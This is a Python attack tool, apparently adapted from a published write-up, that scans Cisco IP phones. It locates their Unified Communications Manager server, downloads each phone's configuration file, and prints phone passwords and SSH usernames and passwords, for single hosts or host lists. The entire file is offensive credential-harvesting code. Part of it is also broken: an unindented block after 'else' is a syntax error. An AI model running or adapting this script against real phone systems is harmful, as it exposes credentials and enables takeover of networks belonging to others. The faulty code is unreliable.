import xmltodict
import requests
import urllib3
import json
import warnings

# script originally made by: 
# https://medium.com/@hackthebox 
# https://infosecwriteups.com/complete-take-over-of-cisco-unified-communications-manager-due-consecutively-misconfigurations-2a1b5ce8bd9a

# this is just a small patch to work with English Cisco devices

# To suppress DeprecationWarnings
with warnings.catch_warnings():
    warnings.filterwarnings("ignore", category=DeprecationWarning)
from argparse import ArgumentParser
from bs4 import BeautifulSoup
from termcolor import colored
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def pretty(d, indent=0):
   for key, value in d.items():
      print('\t' * indent + str(key))
      if isinstance(value, dict):
         pretty(value, indent+1)
      else:
         print('\t' * (indent+1) + str(value))

parser = ArgumentParser(description='Cisco VOIP config downloader')
parser.add_argument('-t', '--target', type=str, metavar='', required=False, help='host')
parser.add_argument('-iL', '--targetlist', type=str, metavar='', required=False, help='host lists')
args = parser.parse_args()

def pprint(string,color):
    print(colored(string, color, attrs=["bold"]))

def download_phonecfg(cucmhost,sep):

    url = "http://%s:6970/%s.cnf.xml.sgn" % (cucmhost,sep)
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9", "Accept-Language": "en-US,en", "Accept-Encoding": "gzip, deflate"}
    r = requests.get(url, headers=headers, verify=False)

    if r.status_code == 200:
        text = r.text.split("<?xml")
        textaux = "<?xml"+text[1]
        config = xmltodict.parse(textaux)
        data = config["device"]
        with open(sep,'w') as configfile:
            configfile.write(json.dumps(data))
        if isinstance(data["sipProfile"]["sipLines"]["line"], list):
            pass
        else:
        pprint("\tOWNER: %s" % data["sipProfile"]["sipLines"]["line"]["displayName"], "yellow")
        pprint("\tPHONE Password: %s" % data["commonProfile"]["phonePassword"], "yellow")
        pprint("\tSSH ENABLED: %s" % (data["commonConfig"]["sshAccess"]), "yellow")
        pprint("\tSSH USERID: %s" % data["sshUserId"], "yellow")
        pprint("\tSSH PASS: %s" % data["sshPassword"], "yellow")
        if data["userId"] != None:
            pprint("\tKEY FILE: http://%s:6970/%s" % (cucmhost,data["userId"]["@serviceProfileFile"]), "yellow")


def getPhoneInfo(host):
    pprint("\n[!] Targeting %s" % host, "cyan")
    url = "http://%s:80/CGI/Java/Serviceability?adapter=device.statistics.configuration" % host
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "DNT": "1", "Upgrade-Insecure-Requests": "1"}
    r = requests.get(url, headers=headers,verify=False)
    if r.status_code == 200:
        soup = BeautifulSoup(r.text, 'html.parser')
        if soup.find("b", text=" MAC address") == None:
            pprint("PHONE HAS NO CUCM SERVER","red")
        else:
            mac = soup.find("b", text=" MAC address").parent.find_next_siblings()[1].text
            sep = soup.find("b", text=" Host name").parent.find_next_siblings()[1].text
            dhcp = soup.find("b", text=" DHCP").parent.find_next_siblings()[1].text
            router = ""
            if soup.find("b", text=" De") != None:
                router = soup.find("b", text=" Default router").parent.find_next_siblings()[1].text
            dns = soup.find("b", text=" DNS server 1").parent.find_next_siblings()[1].text
            tftp = soup.find("b", text=" TFTP server 1").parent.find_next_siblings()[1].text
            cucm1 = ""
            if soup.find("b", text=" CUCM server1") != None:
                cucm1 = soup.find("b", text=" CUCM server1").parent.find_next_siblings()[1].text
                pprint("\tMAC_ADDR: %s\n\tSEP: %s \n\tDHCP: %s \n\tROUTER_ADDR: %s \n\tDNS_ADDR: %s \n\tTFTP_ADDR: %s \n\tCISCO_CUCM: %s"%(mac,sep,dhcp,router,dns,tftp,cucm1),"red")
                cucm1aux = cucm1.split(" ")
                cucm1aux = cucm1aux[0]
                download_phonecfg(cucm1aux,sep)
            else:
                pprint("PHONE HAS NO CUCM SERVER","red")

if args.target:
    getPhoneInfo(args.target)
if args.targetlist:
    with open(args.targetlist) as list_file:
        for target in list_file.readlines():
            getPhoneInfo(target.strip())
